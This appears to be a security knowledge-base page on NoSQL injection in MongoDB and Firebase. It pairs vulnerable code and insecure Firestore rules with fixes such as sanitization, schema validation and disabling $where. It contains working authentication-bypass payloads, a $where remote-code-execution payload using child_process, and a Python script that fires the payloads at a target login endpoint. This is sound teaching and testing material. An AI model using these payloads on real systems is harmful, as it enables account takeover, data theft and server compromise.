# NoSQL Injection

**Tags:** #critical #nosql #mongodb #firebase #injection #auth-bypass
**OWASP:** A03:2021 Injection
**CVSS Base:** 9.8 (Critical — authentication bypass with MongoDB operators)

---

## 📖 What it is

NoSQL databases (MongoDB, CouchDB, Firebase/Firestore) have their own query operation grammar that can be injected when user input is passed directly to query methods without sanitization.

---

## 🔍 `grep_search` Tactics

```
find({
findOne({
req.body
req.query
$where
$gt
$lt
$ne
$in
$regex
mongoose
mongo-sanitize
express-mongo-sanitize
firestore.rules
allow read, write
```

---

## 💣 MongoDB Operator Injection

### Authentication Bypass with `$gt`

**Vulnerable Code:**
```javascript
//  VULNERABLE  req.body passed directly to findOne()
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username, password });  // body injected!
    if (user) {
        res.json({ token: generateToken(user) });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});
```

**Exploit — Injection via JSON body:**
```json
{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
}
```

**Resulting query in MongoDB:**
```javascript
// $gt: "" means "greater than empty string"  all documents pass!
db.users.findOne({ username: {$gt: ""}, password: {$gt: ""} })
// Returns the FIRST user (usually admin) without checking the password
```

---

### Other Bypass Operators

```json
// $regex  matches any password
{
    "username": "admin",
    "password": {"$regex": ".*"}
}

// $ne  "not equal to null" = everything
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}

// $in  list of possible values
{
    "username": {"$in": ["admin", "administrator", "root"]},
    "password": {"$ne": ""}
}
```

---

### `$where` — JavaScript Server-Side Execution

```json
{
    "username": "admin",
    "$where": "function() { return true; }"
}
```

**More dangerous — sleep for time-based detection:**
```json
{
    "$where": "function() { sleep(5000); return true; }"
}
```

**RCE if `javascriptEnabled: true` in MongoDB:**
```json
{
    "$where": "function() { return require('child_process').execSync('id').toString(); }"
}
```

---

### Injection via Query String (GET parameters)

```
# URL with NoSQL operator
GET /api/users?username[$gt]=&password[$gt]=
GET /api/users?username[$ne]=null
```

**Vulnerable code:**
```javascript
//  VULNERABLE  req.query passed directly
User.find(req.query)  // full query string as filter!
```

---

## 💣 Firebase / Firestore — Insecure Rules

```javascript
//  CRITICAL  entire database is public
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // ANYONE CAN READ AND WRITE
    }
  }
}
```

```javascript
//  HIGH  no authentication required
match /users/{userId} {
    allow read: if true;         // all user data is public
    allow write: if true;        // anyone can modify any user
}
```

```javascript
//  CORRECT  authentication and ownership
match /users/{userId} {
    allow read: if request.auth != null && request.auth.uid == userId;
    allow write: if request.auth != null && request.auth.uid == userId;
}
```

---

## 🧪 Validation Script

```python
# .tmp/validate_nosqli.py
import requests, json

TARGET = "http://target.com"
ENDPOINT = "/api/login"

PAYLOADS = [
    # Operator injection
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    # $where time-based (detected by slow response time)
    {"username": "admin", "$where": "function(){sleep(3000);return true;}"},
]

for payload in PAYLOADS:
    import time
    start = time.time()
    try:
        r = requests.post(f"{TARGET}{ENDPOINT}",
                         json=payload,
                         headers={"Content-Type": "application/json"},
                         timeout=10)
        elapsed = time.time() - start
        
        has_token = 'token' in r.text.lower() or 'session' in r.text.lower()
        is_slow = elapsed >= 2.5  # $where sleep
        
        if has_token:
            print(f"[🔴 CRITICAL] Auth Bypass via NoSQLi: {json.dumps(payload)}")
            print(f"  Response: {r.text[:200]}")
        elif is_slow:
            print(f"[🔴 CRITICAL] Time-based NoSQLi ($where): elapsed={elapsed:.1f}s")
        else:
            print(f"[ok] {json.dumps(payload)} - {r.status_code} ({elapsed:.1f}s)")
    except Exception as e:
        print(f"[error] {e}")
```

---

## 🛡️ Fix

### Input Sanitization with `express-mongo-sanitize`

```javascript
//  CORRECT  sanitize req.body and req.query
const mongoSanitize = require('express-mongo-sanitize');

app.use(mongoSanitize({
    replaceWith: '_',  // replace $ and . with _
}));

// Optionally, strict mode that completely removes operators
app.use(mongoSanitize());
```

### Schema Validation (Joi/Yup)

```javascript
//  CORRECT  validate that fields are strings
const Joi = require('joi');

const loginSchema = Joi.object({
    username: Joi.string().required(),  // ensures it's a string, not an object
    password: Joi.string().required(),
});

app.post('/login', async (req, res) => {
    const { error, value } = loginSchema.validate(req.body);
    if (error) return res.status(400).json({ error: error.message });
    
    const { username, password } = value;  // validated strings
    const user = await User.findOne({ username, password: hashPassword(password) });
    // ...
});
```

### Disable `$where` in MongoDB

```javascript
// mongodb.conf
javascriptEnabled: false
```

---

## 🔗 Chain Exploits

```
NoSQL Injection Auth Bypass  Admin access  Full database dump
MongoDB $where RCE  Total compromise of the database server
Firebase open rules  Dump of all user data  GDPR violation
NoSQL Injection + role field  Privilege escalation in the filter
Time-based NoSQLi + enumeration  Dump of valid usernames for credential stuffing
```

---

## 📌 References
- [[sql-injection-sqli]]
- [[graphql-attack-surface]]
- [[authentication-session-management]]
- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)